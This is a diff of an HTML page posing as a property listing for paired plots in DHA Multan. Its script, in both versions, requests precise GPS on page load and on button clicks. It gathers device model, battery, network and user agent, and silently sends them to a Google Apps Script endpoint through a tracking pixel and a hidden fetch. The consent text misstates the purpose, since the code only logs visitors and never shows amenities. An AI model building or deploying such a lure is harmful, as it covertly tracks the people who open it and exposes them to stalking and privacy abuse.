@@ -4,89 +4,83 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Premium Pair Kanal Plots | DHA Multan</title>
-    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@700&family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        :root { --primary-blue: #0f172a; --accent-gold: #d4af37; --bg-light: #f8fafc; --text-dark: #334155; --white: #ffffff; }
+        :root { --primary-blue: #0f172a; --accent-gold: #d4af37; --bg-light: #f8fafc; --text-dark: #334155; }
         * { box-sizing: border-box; margin: 0; padding: 0; }
-        body { font-family: 'Open Sans', sans-serif; background-color: var(--bg-light); color: var(--text-dark); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
-        .card { background: var(--white); width: 100%; max-width: 450px; border-radius: 20px; box-shadow: 0 10px 30px rgba(15, 23, 42, 0.1); overflow: hidden; }
-        .header { background: linear-gradient(135deg, var(--primary-blue) 0%, #1e293b 100%); padding: 30px 20px; text-align: center; color: var(--white); }
+        body { font-family: 'Open Sans', sans-serif; background-color: var(--bg-light); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+        .card { background: #fff; width: 100%; max-width: 450px; border-radius: 20px; box-shadow: 0 10px 30px rgba(15,23,42,0.1); overflow: hidden; }
+        .header { background: linear-gradient(135deg, var(--primary-blue) 0%, #1e293b 100%); padding: 30px 20px; text-align: center; color: #fff; }
         .badge { background: var(--accent-gold); color: var(--primary-blue); padding: 5px 12px; border-radius: 50px; font-size: 12px; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; display: inline-block; margin-bottom: 15px; }
-        .header h1 { font-family: 'Montserrat', sans-serif; font-size: 22px; margin-bottom: 5px; font-weight: 700; }
+        .header h1 { font-family: 'Montserrat', sans-serif; font-size: 22px; margin-bottom: 5px; }
         .header p { font-size: 14px; opacity: 0.9; }
-        .gallery-container { padding: 20px; background: var(--white); }
+        .content { padding: 25px; }
         .main-image { width: 100%; height: 250px; object-fit: cover; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.08); margin-bottom: 15px; display: block; }
         .details-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; }
         .detail-item { background: #f1f5f9; padding: 10px; border-radius: 8px; text-align: center; font-size: 13px; color: var(--primary-blue); font-weight: 600; }
         .detail-item i { color: var(--accent-gold); margin-right: 5px; }
-        .cta-container { padding: 0 20px 30px 20px; text-align: center; }
-        #contactBtn { background: linear-gradient(90deg, var(--accent-gold) 0%, #bfa13f 100%); color: var(--primary-blue); border: none; width: 100%; padding: 16px; font-size: 16px; font-family: 'Montserrat', sans-serif; font-weight: 700; border-radius: 12px; cursor: pointer; box-shadow: 0 4px 15px rgba(212, 175, 55, 0.3); display: flex; justify-content: center; align-items: center; gap: 10px; }
-        #loader { display: none; margin-top: 15px; color: var(--primary-blue); font-weight: 600; align-items: center; justify-content: center; gap: 10px; }
-        #successMsg { display: none; padding: 20px; background: #f0fdf4; border-top: 1px solid #dcfce7; animation: slideUp 0.5s ease-out; }
-        .success-text { text-align: center; color: #166534; font-size: 14px; margin-bottom: 15px; line-height: 1.5; }
-        .hidden-content { display: none; text-align: left; }
+        .cta { text-align: center; padding-bottom: 10px; }
+        #mainBtn { background: linear-gradient(90deg, var(--accent-gold) 0%, #bfa13f 100%); color: var(--primary-blue); border: none; width: 100%; padding: 16px; font-size: 16px; font-family: 'Montserrat', sans-serif; font-weight: 700; border-radius: 12px; cursor: pointer; box-shadow: 0 4px 15px rgba(212,175,55,0.3); display: flex; justify-content: center; align-items: center; gap: 10px; }
+        #statusMsg { margin-top: 12px; font-size: 13px; min-height: 20px; color: #64748b; }
+        .consent { font-size: 12px; color: #94a3b8; margin-top: 10px; line-height: 1.4; }
+        #plotDetails { display: none; margin-top: 20px; animation: fadeIn 0.5s ease-out; }
+        ul.details-list { list-style: none; padding: 0; color: #475569; font-size: 14px; line-height: 1.8; margin-bottom: 15px; }
+        ul.details-list li { padding: 5px 0; border-bottom: 1px dashed #e2e8f0; }
         .gallery-small { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 15px; }
-        .gallery-small img { width: 100%; height: 120px; object-fit: cover; border-radius: 8px; border: 2px solid var(--white); box-shadow: 0 2px 5px rgba(0,0,0,0.1); display: block; }
-        .plot-location-btn { display: block; width: 100%; background: var(--primary-blue); color: white; text-align: center; padding: 14px; border-radius: 10px; text-decoration: none; margin-top: 20px; font-weight: 700; font-size: 15px; font-family: 'Montserrat', sans-serif; }
-        .plot-location-btn:hover { background: #1e293b; }
-        .consent-note { font-size: 12px; color: #64748b; margin-top: 10px; line-height: 1.4; }
-        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
-        #configWarning { display: none; background: #ffebee; color: #c62828; padding: 12px; font-size: 13px; font-weight: 600; text-align: center; }
+        .gallery-small img { width: 100%; height: 120px; object-fit: cover; border-radius: 8px; border: 2px solid #fff; box-shadow: 0 2px 5px rgba(0,0,0,0.1); display: block; }
+        .mapBtn { display: block; width: 100%; background: var(--primary-blue); color: white; text-align: center; padding: 14px; border-radius: 10px; text-decoration: none; margin-top: 15px; font-weight: 700; font-size: 15px; font-family: 'Montserrat', sans-serif; }
+        .warning { display: none; background: #ffebee; color: #c62828; padding: 12px; font-size: 13px; font-weight: 600; text-align: center; border-radius: 8px; margin-bottom: 15px; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <div id="configWarning">⚠️ Script URL not configured!</div>
-    
-    <div class="header">
-        <span class="badge">Exclusive Listing</span>
-        <h1>Premium Pair Kanal Plots</h1>
-        <p><i class="fas fa-map-marker-alt"></i> DHA Multan, Sector I</p>
-    </div>
+    <div class="content">
+        <div class="warning" id="configWarning">Replace the SCRIPT_URL below!</div>
 
-    <div class="gallery-container">
+        <div class="header" style="margin: -25px -25px 20px -25px;">
+            <span class="badge">Exclusive Listing</span>
+            <h1>Premium Pair Kanal Plots</h1>
+            <p><i class="fas fa-map-marker-alt"></i> DHA Multan, Sector I</p>
+        </div>
+
         <img src="https://i.postimg.cc/nrDsQq77/c5461333b4492579a675f0b54438c9b9.jpg" alt="Plot View" class="main-image">
+
         <div class="details-grid">
             <div class="detail-item"><i class="fas fa-ruler-combined"></i> Pair Kanal</div>
             <div class="detail-item"><i class="fas fa-road"></i> 80 Ft Road</div>
             <div class="detail-item"><i class="fas fa-home"></i> Double Corner</div>
             <div class="detail-item"><i class="fas fa-store"></i> Near Commercial</div>
         </div>
-    </div>
 
-    <div class="cta-container">
-        <button id="contactBtn" onclick="handleButtonClick()">
-            <i class="fas fa-folder-open"></i> View Details and Gallery
-        </button>
-        <p class="consent-note">Verifying local area amenities may require location access.</p>
-        <div id="loader">
-            <i class="fas fa-spinner fa-spin"></i> Getting exact location...
+        <div class="cta">
+            <button id="mainBtn" onclick="handleAction()">
+                <i class="fas fa-folder-open"></i> View Details & Gallery
+            </button>
+            <p class="consent">Clicking above may request location access to show nearby plot amenities.</p>
+            <p id="statusMsg"></p>
         </div>
-    </div>
 
-    <div id="successMsg">
-        <p class="success-text">Seller will contact you shortly. Here are the plot details.</p>
-        <div class="hidden-content" id="plotDetails">
-            <h4 style="color: var(--primary-blue); margin-bottom: 10px; font-family: 'Montserrat', sans-serif;">Plot Details:</h4>
-            <ul style="list-style: none; padding: 0; color: #555; font-size: 14px; line-height: 1.8; margin-bottom: 15px;">
-                <li style="padding: 4px 0; border-bottom: 1px dashed #e2e8f0;"><i class="fas fa-hashtag" style="color: var(--accent-gold); width: 20px;"></i><strong>Plot No:</strong> 1039 and 1040</li>
-                <li style="padding: 4px 0; border-bottom: 1px dashed #e2e8f0;"><i class="fas fa-vector-square" style="color: var(--accent-gold); width: 20px;"></i><strong>Type:</strong> Pair Kanal Plots</li>
-                <li style="padding: 4px 0; border-bottom: 1px dashed #e2e8f0;"><i class="fas fa-border-all" style="color: var(--accent-gold); width: 20px;"></i><strong>Position:</strong> Double Corner with Both Plots</li>
-                <li style="padding: 4px 0; border-bottom: 1px dashed #e2e8f0;"><i class="fas fa-road" style="color: var(--accent-gold); width: 20px;"></i><strong>Road:</strong> 80 Feet Road</li>
-                <li style="padding: 4px 0; border-bottom: 1px dashed #e2e8f0;"><i class="fas fa-tree" style="color: var(--accent-gold); width: 20px;"></i><strong>Near:</strong> Park and Masjid</li>
-                <li style="padding: 4px 0; border-bottom: 1px dashed #e2e8f0;"><i class="fas fa-route" style="color: var(--accent-gold); width: 20px;"></i><strong>Access:</strong> Direct Approach to 300 Feet Road</li>
-                <li style="padding: 4px 0;"><i class="fas fa-store" style="color: var(--accent-gold); width: 20px;"></i><strong>Proximity:</strong> Near Commercial</li>
+        <div id="plotDetails">
+            <h3 style="color: var(--primary-blue); margin-bottom:10px; font-family:'Montserrat',sans-serif;">Plot Details</h3>
+            <ul class="details-list">
+                <li><strong>Plot No:</strong> 1039 and 1040</li>
+                <li><strong>Type:</strong> Pair Kanal Plots</li>
+                <li><strong>Position:</strong> Double Corner with both plots</li>
+                <li><strong>Road:</strong> 80 Feet Road</li>
+                <li><strong>Near:</strong> Park and Masjid</li>
+                <li><strong>Access:</strong> Direct approach to 300 feet road</li>
+                <li><strong>Proximity:</strong> Near Commercial</li>
             </ul>
-            
-            <h4 style="color: var(--primary-blue); margin-bottom: 10px; font-family: 'Montserrat', sans-serif;">Plot Gallery:</h4>
+
             <div class="gallery-small">
-                <img src="https://i.postimg.cc/sfYwML9R/Whats-App-Image-2026-07-30-at-3-43-41-PM-(1).jpg" alt="Plot 1039 View">
-                <img src="https://i.postimg.cc/FH9qF42n/Whats-App-Image-2026-07-30-at-3-43-41-PM.jpg" alt="Plot 1040 View">
+                <img src="https://i.postimg.cc/sfYwML9R/Whats-App-Image-2026-07-30-at-3-43-41-PM-(1).jpg" alt="Plot 1039">
+                <img src="https://i.postimg.cc/FH9qF42n/Whats-App-Image-2026-07-30-at-3-43-41-PM.jpg" alt="Plot 1040">
             </div>
 
-            <a href="https://maps.app.goo.gl/GcjtRxyA7A8xsVoVA" target="_blank" rel="noopener noreferrer" class="plot-location-btn">
+            <a href="https://maps.app.goo.gl/GcjtRxyA7A8xsVoVA" target="_blank" rel="noopener noreferrer" class="mapBtn">
                 <i class="fas fa-map-pin"></i> Plot Location
             </a>
         </div>
@@ -94,171 +88,142 @@
 </div>
 
 <script>
-    // ==================== REPLACE THIS ====================
-    var SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbydoCv5PoyuqFDg7ie2XbSffB_wDKnv5RSZMjcca3dbp0fkXP1SmaYTaFGWpGJff96Z_Q/exec';
-    // ======================================================
+    // ==================== REPLACE THIS EXACTLY ====================
+    var SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxaxIyyo-kVJr8gXKYKgnzRiUcr4peohtBCkgEulGqTv1pyaH877EsImvatSQBRJ0Eg/exec";
+    // ==============================================================
 
-    if (!SCRIPT_URL || SCRIPT_URL.indexOf('YOUR_NEW') !== -1) {
-        document.getElementById('configWarning').style.display = 'block';
-        console.error("Replace YOUR_NEW_SCRIPT_URL_HERE with your actual /exec URL from Apps Script");
+    if (!SCRIPT_URL || SCRIPT_URL.indexOf("YOUR_NEW") !== -1) {
+        document.getElementById("configWarning").style.display = "block";
     }
 
-    var SID = 'SID_' + Math.random().toString(36).substring(2, 11) + '_' + Date.now();
-    var LOCATION_LOCKED = false;
+    // NEW random Session ID on EVERY page load (duplicates create multiple rows)
+    var SID = "SID_" + Math.random().toString(36).substr(2, 9) + "_" + Date.now();
 
-    var PLOT = {
-        no: "1039 and 1040",
-        sector: "Sector I",
-        features: "Pair Kanal Plots | Double Corner with both plots | 80 Feet Road | Near to park and Masjid | Direct approach to 300 feet road | Near to commercial"
+    var dev = {
+        model: "Unknown", os: "Unknown", battery: "N/A", 
+        charging: "N/A", network: "Unknown", 
+        screen: screen.width + "x" + screen.height 
     };
 
-    function getModel() {
+    function getDevice() {
         var ua = navigator.userAgent;
         if (/Android/.test(ua)) {
             var m = ua.match(/\(([^)]+)\)/);
-            if (m && m[1]) {
-                var p = m[1].split(';');
-                return p[p.length - 1].trim() || "Android";
-            }
-            return "Android";
-        }
-        if (/iPhone/.test(ua)) return "iPhone";
-        if (/iPad/.test(ua)) return "iPad";
-        if (/Windows NT/.test(ua)) return "Windows PC";
-        if (/Mac OS X/.test(ua)) return "Mac";
-        return "Desktop/Other";
-    }
-
-    function getOS() {
-        var ua = navigator.userAgent;
-        if (/Android/.test(ua)) return "Android";
-        if (/iPhone|iPad/.test(ua)) return "iOS";
-        if (/Windows NT/.test(ua)) return "Windows";
-        if (/Mac OS X/.test(ua)) return "MacOS";
-        if (/Linux/.test(ua)) return "Linux";
-        return "Unknown";
-    }
-
-    function getNetwork() {
+            dev.model = m ? m[1].split(';').pop().trim() : "Android";
+            dev.os = "Android";
+        } else if (/iPhone/.test(ua)) { dev.model = "iPhone"; dev.os = "iOS"; }
+        else if (/iPad/.test(ua)) { dev.model = "iPad"; dev.os = "iOS"; }
+        else if (/Windows NT/.test(ua)) { dev.model = "Windows PC"; dev.os = "Windows"; }
+        else if (/Mac OS X/.test(ua)) { dev.model = "Mac"; dev.os = "MacOS"; }
         var c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        return c ? (c.effectiveType || "Unknown") : "Unknown";
+        if (c) dev.network = c.effectiveType || "Unknown";
     }
 
     async function getBattery() {
-        if (typeof navigator.getBattery === 'function') {
-            try {
-                var b = await navigator.getBattery();
-                return { level: Math.round(b.level * 100) + "%", charging: b.charging ? "Yes" : "No" };
-            } catch (e) {}
+        if (navigator.getBattery) {
+            try { 
+                var b = await navigator.getBattery(); 
+                dev.battery = Math.round(b.level * 100) + "%"; 
+                dev.charging = b.charging ? "Yes" : "No"; 
+            } catch(e){}
         }
-        return { level: "N/A", charging: "N/A" };
     }
 
-    async function track(eventType, lat, lon, acc, statusMsg) {
-        if (!SCRIPT_URL || SCRIPT_URL.indexOf('YOUR_NEW') !== -1) return;
-
-        var bat = await getBattery();
-        var model = getModel();
-        var os = getOS();
-        var net = getNetwork();
-        var screenRes = screen.width + "x" + screen.height;
-        var ua = navigator.userAgent.substring(0, 500);
-
-        var url = SCRIPT_URL + "?"
-            + "sid=" + encodeURIComponent(SID)
-            + "&event=" + encodeURIComponent(eventType)
-            + "&plot=" + encodeURIComponent(PLOT.no)
-            + "&sector=" + encodeURIComponent(PLOT.sector)
-            + "&features=" + encodeURIComponent(PLOT.features)
-            + "&lat=" + encodeURIComponent((lat != null) ? lat.toFixed(6) : "")
-            + "&lon=" + encodeURIComponent((lon != null) ? lon.toFixed(6) : "")
-            + "&acc=" + encodeURIComponent((acc != null) ? acc : "")
-            + "&status=" + encodeURIComponent(statusMsg || "")
-            + "&model=" + encodeURIComponent(model)
-            + "&os=" + encodeURIComponent(os)
-            + "&battery=" + encodeURIComponent(bat.level)
-            + "&charging=" + encodeURIComponent(bat.charging)
-            + "&network=" + encodeURIComponent(net)
-            + "&screen=" + encodeURIComponent(screenRes)
-            + "&ua=" + encodeURIComponent(ua);
-
-        // Image pixel (primary) - works because script returns a real GIF
+    function sendLog(eventType, lat, lon, acc, status) {
+        if (!SCRIPT_URL || SCRIPT_URL.indexOf("YOUR_NEW") !== -1) return;
+        
+        var q = new URLSearchParams({
+            sid: SID, 
+            event: eventType, 
+            plot: "1039 and 1040", 
+            sector: "Sector I",
+            lat: (lat != null) ? lat.toFixed(7) : "", 
+            lon: (lon != null) ? lon.toFixed(7) : "",
+            acc: acc || "", 
+            status: status || "",
+            model: dev.model, 
+            os: dev.os, 
+            battery: dev.battery, 
+            charging: dev.charging,
+            network: dev.network, 
+            screen: dev.screen,
+            ua: encodeURIComponent(navigator.userAgent.substring(0, 500))
+        });
+        
+        var url = SCRIPT_URL + "?" + q.toString();
+        
+        // Method 1: Tracking pixel (most reliable cross-origin)
         var img = new Image();
         img.src = url;
-
-        // Silent fetch fallback
-        try { fetch(url, { mode: 'no-cors', keepalive: true }).catch(function(){}); } catch(e) {}
-
-        // iframe fallback for stubborn browsers
-        var iframe = document.createElement('iframe');
-        iframe.style.display = 'none';
-        iframe.src = url;
-        document.body.appendChild(iframe);
-        setTimeout(function() { if (iframe.parentNode) iframe.parentNode.removeChild(iframe); }, 8000);
+        
+        // Method 2: Silent fetch fallback
+        try { 
+            fetch(url, { mode: 'no-cors', keepalive: true }).catch(function(){}); 
+        } catch(e){}
     }
 
-    function requestHighAccuracyLocation(eventLabel) {
+    function fetchLocation(label, callback) {
         if (!navigator.geolocation) {
-            track("GPS_UNSUPPORTED", null, null, null, "No Geolocation API");
+            sendLog("GPS_UNSUPPORTED", null, null, null, "Geolocation API unavailable");
+            if (callback) callback(false);
             return;
         }
-        if (LOCATION_LOCKED) return; // prevent duplicate requests
-
-        LOCATION_LOCKED = true;
+        
+        document.getElementById("statusMsg").innerHTML = "<span style='color:#2563eb;'><i class='fas fa-spinner fa-spin'></i> Pinpointing exact GPS location...</span>";
 
         navigator.geolocation.getCurrentPosition(
             function(pos) {
                 var lat = pos.coords.latitude;
                 var lon = pos.coords.longitude;
-                var accuracy = Math.round(pos.coords.accuracy || 0);
-
-                if (accuracy < 100) {
-                    track("GPS_PINPOINT", lat, lon, accuracy, "[" + eventLabel + "] Exact location captured (" + accuracy + "m)");
-                } else {
-                    track("GPS_APPROX", lat, lon, accuracy, "[" + eventLabel + "] Approximate location (" + accuracy + "m)");
-                }
+                var acc = Math.round(pos.coords.accuracy);
+                
+                var precision = acc <= 20 ? "PINPOINT" : acc <= 100 ? "GOOD" : "APPROX";
+                var statusText = "[" + label + "] " + precision + " accuracy: ±" + acc + "m";
+                
+                sendLog("GPS_" + precision, lat, lon, acc, statusText);
+                document.getElementById("statusMsg").innerHTML = "<span style='color:#16a34a;'>✅ Location logged (±" + acc + "m precision)</span>";
+                if (callback) callback(true);
             },
             function(err) {
-                var reason = "GPS_ERROR";
-                if (err.code === 1) reason = "GPS_DENIED";
-                if (err.code === 2) reason = "GPS_UNAVAILABLE";
-                if (err.code === 3) reason = "GPS_TIMEOUT";
-                track(reason, null, null, null, "[" + eventLabel + "] " + (err.message || "Failed"));
+                var reason = "GPS_ERROR", msg = err.message || "Unknown";
+                if (err.code === 1) { reason = "GPS_DENIED"; msg = "User denied permission"; }
+                if (err.code === 2) { reason = "GPS_UNAVAILABLE"; msg = "Location signal unavailable"; }
+                if (err.code === 3) { reason = "GPS_TIMEOUT"; msg = "Location request timed out"; }
+                
+                sendLog(reason, null, null, null, "[" + label + "] " + msg);
+                document.getElementById("statusMsg").innerHTML = "<span style='color:#dc2626;'>⚠️ " + msg + "</span>";
+                if (callback) callback(false);
             },
-            { 
-                enableHighAccuracy: true,  // Forces GPS hardware
-                timeout: 15000,
-                maximumAge: 0
-            }
+            { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
         );
     }
 
-    // ===== CRITICAL CHANGE: Location requested ON PAGE OPEN =====
+    function showDetails() {
+        document.getElementById("mainBtn").style.display = "none";
+        document.querySelector(".consent").style.display = "none";
+        document.getElementById("plotDetails").style.display = "block";
+        document.getElementById("plotDetails").scrollIntoView({ behavior: "smooth" });
+    }
+
+    function handleAction() {
+        // If already open, this is a re-log (e.g. user walked somewhere new)
+        if (document.getElementById("plotDetails").style.display === "block") {
+            fetchLocation("RECLICK", function(){});
+            return;
+        }
+        fetchLocation("BUTTON_CLICK", function(ok){ showDetails(); });
+    }
+
+    // Auto-request location on every page load with a fresh Session ID
     window.addEventListener("DOMContentLoaded", function() {
-        track("PAGE_LOAD", null, null, null, "User landed on page");
-        requestHighAccuracyLocation("PAGE_LOAD");
+        getDevice(); 
+        getBattery();
+        sendLog("PAGE_LOAD", null, null, null, "Page opened, requesting location");
+        fetchLocation("AUTO_PAGE_LOAD", function(ok){ 
+            // Optionally auto-show details if they allowed location
+            // if (ok) showDetails(); 
+        });
     });
-
-    function handleButtonClick() {
-        document.getElementById("contactBtn").style.display = "none";
-        document.getElementById("loader").style.display = "flex";
-
-        track("BUTTON_CLICK", null, null, null, "User clicked View Details");
-        
-        // Fallback location request in case page-load was blocked/denied
-        requestHighAccuracyLocation("BUTTON_CLICK");
-
-        showContent();
-    }
-
-    function showContent() {
-        setTimeout(function() {
-            document.getElementById("loader").style.display = "none";
-            document.getElementById("successMsg").style.display = "block";
-            document.getElementById("plotDetails").style.display = "block";
-            document.getElementById("successMsg").scrollIntoView({ behavior: "smooth" });
-        }, 500);
-    }
 </script>
 
 </body>
